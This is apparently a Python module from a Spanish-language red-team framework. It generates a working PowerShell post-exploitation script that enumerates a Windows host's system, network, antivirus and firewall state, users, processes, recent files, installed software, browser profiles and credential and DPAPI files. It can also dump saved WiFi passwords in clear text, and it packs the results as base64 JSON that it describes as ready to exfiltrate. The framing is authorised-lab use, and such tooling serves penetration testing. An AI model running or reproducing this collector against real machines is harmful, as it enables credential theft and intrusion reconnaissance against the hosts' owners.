# -*- coding: utf-8 -*-
"""
Módulo post/host_audit
======================
Generador de un script PowerShell de AUDITORÍA DE HOST (recon post-
explotación) inspirado en «EvasiveAudit v4» de la suite red team propia:
sistema, red, defensas, usuarios, procesos, servicios, tareas programadas,
ficheros recientes, software instalado, datos de navegador, ficheros de
credenciales y (opcional) claves WiFi. Salida JSON en base64 lista para
exfiltrar/decanifar offline.

DIFERENCIA DEL ORIGINAL: el generador NO incluye bypass de AMSI ni
técnicas de evasión; el script solo COLECTA información del host donde
se ejecuta con consentimiento (laboratorio o engagement autorizado).
Los hallazgos alimentan el informe y el análisis de superficie defensiva.

Riesgo: ALTO → exige AUTHORIZED (técnica de colecta post-explotación).
ATT&CK: T1082, T1016, T1087.001, T1057, T1005.
"""

import shutil
from pathlib import Path

from core.base_module import BaseModulo

SALIDA_RAIZ = Path(__file__).resolve().parent.parent.parent / "output" / "host_audit"

# Funciones de colecta (versión fiel del original, sin funciones evasivas)
FUNC_SISTEMA = r"""
function Get-AuditSystem {
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
    return @{
        Hostname = $env:COMPUTERNAME
        User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        OS = $os.Caption
        Version = $os.Version
        BuildNumber = $os.BuildNumber
        Arch = $os.OSArchitecture
        IsAdmin = $isAdmin
        Uptime = ([math]::Round(((Get-Date) - $os.LastBootUpTime).TotalMinutes, 1))
        ProcessCount = (Get-Process).Count
        RAM_GB = [math]::Round($cs.TotalPhysicalMemory / 1GB, 2)
        CPU = $cpu.Name
        Manufacturer = $cs.Manufacturer
        Model = $cs.Model
        Domain = $cs.Domain
    }
}
"""

FUNC_RED = r"""
function Get-AuditNetwork {
    $adapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Up" }
    $ipconfig = Get-NetIPConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.IPv4DefaultGateway }
    $connections = @()
    try {
        $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
            Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess -First 30
    } catch {}
    $shares = @()
    try { $shares = Get-SmbShare -ErrorAction SilentlyContinue | Select-Object Name, Path } catch {}
    $publicIP = ""
    try { $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -TimeoutSec 5).ip } catch {}
    return @{
        ActiveAdapters = $adapters | Select-Object Name, MacAddress, LinkSpeed
        IPAddresses = @($ipconfig | ForEach-Object { $_.IPv4Address.IPAddress })
        PublicIP = $publicIP
        DNSServers = @(Get-DnsClientServerAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | ForEach-Object { $_.ServerAddresses })
        OpenPorts = $connections
        SMBShares = $shares
        DefaultGateway = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Select-Object -First 1).NextHop
    }
}
"""

FUNC_DEFENSA = r"""
function Get-AuditDefense {
    $av = @()
    try {
        $av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -ErrorAction SilentlyContinue | Select-Object displayName, productState
    } catch {}
    $firewall = @()
    try { $firewall = Get-NetFirewallProfile -ErrorAction SilentlyContinue | Select-Object Name, Enabled } catch {}
    $defenderStatus = @{}
    try {
        $mp = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($mp) {
            $defenderStatus = @{
                RealTimeEnabled = $mp.RealTimeProtectionEnabled
                AntivirusEnabled = $mp.AntivirusEnabled
                TamperProtection = $mp.TamperProtectionSource
                BehaviorMonitor = $mp.BehaviorMonitorEnabled
            }
        }
    } catch {}
    return @{ Antivirus = @($av | ForEach-Object { $_.displayName }); Firewall = $firewall; DefenderStatus = $defenderStatus }
}
"""

FUNC_USUARIOS = r"""
function Get-AuditUsers {
    $localUsers = @()
    try { $localUsers = Get-LocalUser -ErrorAction SilentlyContinue | Select-Object Name, Enabled, LastLogon, Description } catch {}
    $admins = @()
    try { $admins = Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue | Select-Object Name, PrincipalSource } catch {}
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    return @{
        LocalUsers = $localUsers
        AdminGroup = $admins
        CurrentUser = $currentUser.Name
        IsElevated = ([Security.Principal.WindowsPrincipal]$currentUser).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    }
}
"""

FUNC_PROCESOS = r"""
function Get-AuditProcesses {
    return Get-Process -ErrorAction SilentlyContinue |
        Sort-Object CPU -Descending -ErrorAction SilentlyContinue |
        Select-Object -First 25 ProcessName, Id, CPU, WorkingSet64, MainWindowTitle
}
"""

FUNC_SERVICIOS = r"""
function Get-AuditServices {
    return Get-Service -ErrorAction SilentlyContinue |
        Where-Object { $_.Status -eq "Running" } |
        Select-Object Name, DisplayName, StartType -First 30
}
"""

FUNC_TAREAS = r"""
function Get-AuditScheduledTasks {
    $tasks = @()
    try {
        $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue |
            Where-Object { $_.State -ne "Disabled" } |
            Select-Object TaskName, TaskPath, State -First 20
    } catch {}
    return $tasks
}
"""

FUNC_RECIENTES = r"""
function Get-AuditRecentFiles {
    $recentPaths = @("$env:USERPROFILE\Recent", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
    $files = @()
    foreach ($path in $recentPaths) {
        if (Test-Path $path) {
            try {
                $items = Get-ChildItem -Path $path -File -ErrorAction SilentlyContinue |
                    Sort-Object LastWriteTime -Descending |
                    Select-Object -First 15 FullName, Length, LastWriteTime
                $files += $items
            } catch {}
        }
    }
    return $files
}
"""

FUNC_APPS = r"""
function Get-AuditInstalledApps {
    $paths = @(
        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*"
    )
    $apps = @()
    foreach ($p in $paths) {
        try {
            $apps += Get-ItemProperty -Path $p -ErrorAction SilentlyContinue |
                Where-Object { $_.DisplayName } |
                Select-Object DisplayName, DisplayVersion, Publisher, InstallDate
        } catch {}
    }
    return $apps | Sort-Object DisplayName -Unique
}
"""

FUNC_BROWSER = r"""
function Get-AuditBrowserData {
    $browsers = @{
        Chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
        Edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
        Firefox = "$env:APPDATA\Mozilla\Firefox\Profiles"
    }
    $found = @()
    foreach ($browser in $browsers.GetEnumerator()) {
        if (Test-Path $browser.Value) {
            $found += @{ Browser = $browser.Key; Path = $browser.Value; Exists = $true }
        }
    }
    return $found
}
"""

FUNC_WIFI = r"""
function Get-AuditWiFiPasswords {
    $profiles = @()
    try {
        $output = netsh wlan show profiles 2>$null | Select-String "Perfil|Profile"
        foreach ($line in $output) {
            $name = ($line -split ":")[-1].Trim()
            if ($name) {
                $keyOutput = netsh wlan show profile name="$name" key=clear 2>$null | Select-String "Contenido de la clave|Key Content"
                $password = if ($keyOutput) { ($keyOutput -split ":")[-1].Trim() } else { "N/A" }
                $profiles += @{ SSID = $name; Password = $password }
            }
        }
    } catch {}
    return $profiles
}
"""

FUNC_CRED_FILES = r"""
function Get-AuditCredentialFiles {
    $credPaths = @(
        "$env:APPDATA\Microsoft\Credentials",
        "$env:LOCALAPPDATA\Microsoft\Credentials",
        "$env:APPDATA\Microsoft\Protect",
        "$env:LOCALAPPDATA\Microsoft\Protect"
    )
    $credFiles = @()
    foreach ($path in $credPaths) {
        if (Test-Path $path) {
            try {
                $files = Get-ChildItem -Path $path -File -Recurse -ErrorAction SilentlyContinue
                foreach ($f in $files) {
                    $credFiles += @{ Path = $f.FullName; Size = $f.Length; LastModified = $f.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") }
                }
            } catch {}
        }
    }
    return $credFiles
}
"""

FUNC_MAIN = r"""
function Invoke-AuditHost {
    [CmdletBinding()]
    param([string]$OutputFile = "$env:TEMP\audit_$(Get-Date -Format 'yyyyMMdd_HHmmss').json")
    Write-Verbose "[*] Recopilando informacion del host (auditoria autorizada)..."
    $results = @{
        SystemInfo = Get-AuditSystem
        NetworkInfo = Get-AuditNetwork
        DefenseInfo = Get-AuditDefense
        Users = Get-AuditUsers
        Processes = Get-AuditProcesses
        Services = Get-AuditServices
        ScheduledTasks = Get-AuditScheduledTasks
        RecentFiles = Get-AuditRecentFiles
        InstalledApps = Get-AuditInstalledApps
{EXTRA}
        Metadata = @{ Date = (Get-Date -Format "yyyy-MM-dd HH:mm:ss"); Origen = "REDHAVOC host_audit (lab)" }
    }
    $json = $results | ConvertTo-Json -Depth 5
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json))
    if ($OutputFile) {
        $encoded | Out-File -FilePath $OutputFile -Force -Encoding UTF8
        Write-Verbose "[+] Guardado: $OutputFile"
    }
    return @{ Encoded = $encoded; FilePath = $OutputFile; Raw = $results }
}

$output = Invoke-AuditHost -Verbose
if ($output) {
    Write-Host "`n[+] Auditoria completada" -ForegroundColor Green
    Write-Host "  - Archivo: $($output.FilePath)" -ForegroundColor Cyan
    Write-Host "  - Hostname: $($output.Raw.SystemInfo.Hostname)" -ForegroundColor Cyan
    Write-Host "  - Usuario: $($output.Raw.SystemInfo.User)" -ForegroundColor Cyan
    Write-Host "  - Domain: $($output.Raw.SystemInfo.Domain)" -ForegroundColor Cyan
    Write-Host "`n[*] Para decodificar resultados (local u offline):" -ForegroundColor Yellow
    Write-Host "  `$data = Get-Content `"$($output.FilePath)`""
    Write-Host "  [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$data)) | ConvertFrom-Json"
}

# NOTA DE REDHAVOC: este script SOLO colecta información local con
# consentimiento (laboratorio / engagement autorizado). No incluye
# técnicas de evasión ni ejecuta nada fuera de la colecta descrita.
"""

README = """# Script de auditoría de host (REDHAVOC)

Generado por `post/host_audit`. Es la versión de laboratorio de una
auditoría de host tipo «EvasiveAudit»: colecta sistema, red, defensas,
usuarios, procesos, servicios, tareas, ficheros recientes, software,
navegadores, ficheros de credenciales{EXTRA_NOTA} y produce JSON en base64.

## Uso (host Windows del LABORATORIO autorizado)
```powershell
powershell -ExecutionPolicy Bypass -File audit_host.ps1
# decodificar el resultado:
$data = Get-Content "%TEMP%\\audit_*.json"
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data)) | ConvertFrom-Json
```

## Qué revisar en el informe
- IsAdmin/IsElevated: nivel de privilegio de la cuenta de prueba.
- DefenseInfo: qué EDR/AV delata la ejecución de PowerShell (ruido opsec).
- NetworkInfo: segmentación real (¿el lab llega a la IP pública?).
- ScheduledTasks / Services: superficie de persistencia legítima.

## Aviso legal
Solo para laboratorio o engagement con autorización escrita. La colecta
no autorizada de datos de un host ajeno es delito. Este script no incluye
técnicas de evasión (sin AMSI bypass, sin ofuscación).
"""


class HostAudit(BaseModulo):
    """Genera el script PS1 de auditoría de host + guía de laboratorio."""

    NAME = "post/host_audit"
    CATEGORIA = "post"
    DESCRIPCION = ("Genera un script PowerShell de auditoría de host (sistema, red, "
                   "defensas, usuarios, procesos, apps, credenciales locales) con "
                   "salida JSON base64. Versión de laboratorio SIN técnicas evasivas.")
    RIESGO = "alto"
    AUTOR = "REDHAVOC"
    REFERENCIA = "EvasiveAudit v4 (suite propia) · PowerSploit Get-Information"
    ATTCK = ("T1082", "T1016", "T1087.001", "T1057", "T1005")

    def definir_opciones(self) -> None:
        self.opciones.declarar("NOMBRE", "audit_host", False, "Nombre base del script generado")
        self.opciones.declarar("INCLUIR_WIFI", "false", False, "Incluir claves WiFi (netsh)")
        self.opciones.declarar("INCLUIR_BROWSER", "true", False, "Incluir rutas de perfiles de navegador")

    def ejecutar(self) -> dict:
        nombre = self.opt("NOMBRE", "audit_host").strip().replace(" ", "_") or "audit_host"
        wifi = self.opt_bool("INCLUIR_WIFI")
        browser = self.opt_bool("INCLUIR_BROWSER", True)

        partes = [FUNC_SISTEMA, FUNC_RED, FUNC_DEFENSA, FUNC_USUARIOS,
                  FUNC_PROCESOS, FUNC_SERVICIOS, FUNC_TAREAS, FUNC_RECIENTES,
                  FUNC_APPS]
        extra_main = []
        if browser:
            partes.append(FUNC_BROWSER)
            extra_main.append("        BrowserData = Get-AuditBrowserData")
        if wifi:
            partes.append(FUNC_WIFI)
            extra_main.append("        WiFiPasswords = Get-AuditWiFiPasswords")
        partes.append(FUNC_CRED_FILES)
        cuerpo = "".join(partes)
        main = FUNC_MAIN.replace("{EXTRA}", "\n".join(extra_main))

        carpeta = SALIDA_RAIZ / f"audit_{nombre}"
        if carpeta.exists():
            shutil.rmtree(carpeta)
        carpeta.mkdir(parents=True)
        (carpeta / f"{nombre}.ps1").write_text(cuerpo + main, encoding="utf-8")
        nota_extra = " y claves WiFi" if wifi else ""
        (carpeta / "README.md").write_text(
            README.replace("{EXTRA_NOTA}", nota_extra), encoding="utf-8")

        ficheros = sorted(str(p) for p in carpeta.iterdir())
        modulos_ps = ["System", "Network", "Defense", "Users", "Processes",
                      "Services", "Tasks", "RecentFiles", "InstalledApps"]
        if browser:
            modulos_ps.append("BrowserData")
        if wifi:
            modulos_ps.append("WiFiPasswords")
        modulos_ps.append("CredentialFiles")

        return {
            "resumen": f"Script de auditoría de host generado en {carpeta} "
                       f"({len(modulos_ps)} módulos de colecta)",
            "carpeta": str(carpeta),
            "ficheros": ficheros,
            "modulos_colecta": modulos_ps,
            "evasion_incluida": "ninguna (por diseño: solo colecta, sin AMSI bypass)",
        }
